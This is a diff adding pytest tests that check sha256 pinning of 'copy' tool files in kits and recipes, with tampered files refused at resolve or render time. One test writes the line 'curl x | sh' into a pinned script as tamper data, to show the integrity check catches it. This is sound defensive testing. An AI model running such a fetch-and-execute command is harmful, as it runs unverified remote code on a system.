@@ -235,6 +235,50 @@ def test_a_changed_skill_file_is_refused_even_when_kit_json_is_not(root):
         recipes.resolve("r")
 
 
+def copy_tool(root, kit, body=b"#!/bin/sh\necho hi\n", **fields):
+    """A file in the kit directory and a `copy` tool pinning it."""
+    (root / "kits" / kit).mkdir(parents=True, exist_ok=True)
+    (root / "kits" / kit / "hi.sh").write_bytes(body)
+    tool = {"name": "hi", "type": "copy", "from": "hi.sh", "to": "/usr/local/bin/hi"}
+    return {**tool, "sha256": hashlib.sha256(body).hexdigest(), **fields}
+
+
+def test_a_changed_copy_file_is_refused_even_when_kit_json_is_not(root):
+    pin = write_kit(root, "tools", tools=[copy_tool(root, "tools")])
+    write_recipe(root, "r", **BASE, kits=[{"name": "tools", "sha256": pin}])
+    assert "COPY files/kit-tools/hi/hi.sh" in rendered("r")
+    (root / "kits" / "tools" / "hi.sh").write_text("#!/bin/sh\ncurl x | sh\n")
+    with pytest.raises(AgentboxError, match=r"hi\.sh is .*, but its sha256 is"):
+        recipes.resolve("r")
+
+
+def test_a_copy_file_changed_after_it_was_read_is_refused_at_render(root):
+    pin = write_kit(root, "tools", tools=[copy_tool(root, "tools")])
+    write_recipe(root, "r", **BASE, kits=[{"name": "tools", "sha256": pin}])
+    recipe = recipes.resolve("r")
+    (root / "kits" / "tools" / "hi.sh").write_text("changed\n")
+    with pytest.raises(AgentboxError, match="but its sha256 is"):
+        recipes.render_recipe(recipe, ".agents/skills")
+
+
+def test_a_kits_copy_needs_a_sha256(root):
+    tool = copy_tool(root, "tools")
+    del tool["sha256"]
+    write_kit(root, "tools", tools=[tool])
+    with pytest.raises(AgentboxError, match="copy needs a sha256"):
+        kits.load("tools")
+
+
+def test_a_recipes_copy_may_be_pinned_but_need_not_be(root):
+    (root / "recipes" / "hi.sh").write_text("hi\n")
+    tool = {"name": "hi", "type": "copy", "from": "hi.sh", "to": "/hi"}
+    write_recipe(root, "r", **BASE, sections=[tool])
+    assert "COPY files/r/hi/hi.sh /hi" in rendered("r")
+    write_recipe(root, "r", **BASE, sections=[{**tool, "sha256": SHA}])
+    with pytest.raises(AgentboxError, match="but its sha256 is"):
+        recipes.resolve("r")
+
+
 def test_a_child_can_re_pin_a_stale_kit(root):
     pin = write_kit(root, "tools", tools=[binary("thing")])
     write_recipe(root, "base", **BASE, kits=[{"name": "tools", "sha256": SHA}])
